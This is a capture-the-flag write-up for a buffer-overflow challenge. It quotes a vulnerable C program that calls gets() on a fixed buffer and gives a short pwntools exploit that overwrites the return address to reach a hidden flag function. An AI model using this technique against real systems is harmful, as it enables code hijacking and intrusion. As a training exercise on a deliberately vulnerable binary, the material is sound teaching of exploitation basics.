# OverFlow1 - 150pt

### Challenge ###
> You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in /problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780 on the shell server.

### Hints ###
> Take control that return address.
> Make sure your address is in Little Endian.

### Solution ###

> In this case, as we can see in vuln.c, we've an executable that contains a function that prints the flag, but it's never called.

    void flag() {
    	char buf[FLAGSIZE];
    	FILE *f = fopen("flag.txt","r");
    	if (f == NULL) {
        	printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
        	exit(0);
    	}

    	fgets(buf,FLAGSIZE,f);
    	printf(buf);
    }

> To solve it, we have to perform an overflow to redirect the program flow to call the flag function.
We find the vulnerability in the vuln function. It use gets to fill a buffer of 64 bytes.

    void vuln(){
        char buf[BUFFSIZE];
        gets(buf);

        printf("Woah, were jumping to 0x%x !\n", get_return_address());
    }

> So we can use it to insert our garbage followed by the flag's function address.
With IDA we can find this address and calculate the distance between the start of the buffer and ebp.

### Executing the exploit ###
> We can do an overflow to call flag function.
We have to provide a BUFFSIZE (that contains 72) and other 4 for ebp. Then we're in ret so if we provide flag's function address we are calling flag.

### Exploit: ###

    garbage = "\x90" * (72 + 4)
    flag_addr = p32(0x080485E6)

    exploit = garbage + flag_addr

    p = process("./vuln")
    p.sendline(exploit)
    p.interactive()